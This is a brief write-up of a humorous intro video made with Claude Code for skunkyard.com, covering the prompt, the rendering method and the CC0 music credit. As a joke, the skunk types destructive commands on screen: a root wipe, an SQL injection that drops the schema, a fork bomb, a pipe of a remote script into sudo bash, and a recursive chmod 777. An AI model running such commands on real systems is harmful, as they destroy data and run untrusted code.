# Skunk intro video

- Made: 2026-11-06, revised 2026-11-07, in Claude Code
- Result: <https://youtu.be/zhGnLH_i6SM>
- Written up: <https://skunkyard.com/experiments/skunk-video/>

## Prompt

> Create a cute 30-second video for skunkyard.com. The skunk from our logo runs
> across the yard for a bit, then hops behind a laptop showing a terminal, puts
> on a ponytail-guy T-shirt, and starts typing code. Have the code run a series
> of funny commands, like `rm -rf /*`, and a `psql` command that looks correct
> but actually deletes all the tables, in the spirit of Little Bobby Tables. Add
> a couple more commands that are well-known exploits or laughable code.
>
> Set it to music: look for open-source or free-to-use music, punk preferably,
> and use a CC0 track.
>
> End the video with credits: "brought to you by skunkyard.com", clickable if
> that's possible, followed by the attribution for the song.

The first paragraph was the first prompt. The second and third were revisions,
given after watching the first version.

## What came out

A 30-second, 1280 × 720 video. Claude drew the scene as an animated web page,
recorded each of its 900 frames in a headless browser, and joined them with the
music in ffmpeg. The skunk types these commands, and replies to each:

- `sudo rm -rf /*`
- `psql -c "INSERT INTO students VALUES ('Robert'); DROP SCHEMA public CASCADE;--');"`
- `:(){ :|:& };:`, the bash fork bomb
- `curl -s https://totally-legit.example/install.sh | sudo bash`
- `sudo chmod -R 777 /`
- `git commit -am "fix" && git push --force origin main`

Music: the first 30 seconds of
[Crate Punks OST](https://opengameart.org/content/crate-punks-ost) by Shuhei
Yasuda, CC0 (public domain).

The credits run for the last 4 seconds. A video file can't hold a clickable
link, so the link to skunkyard.com goes in the text of each post instead.
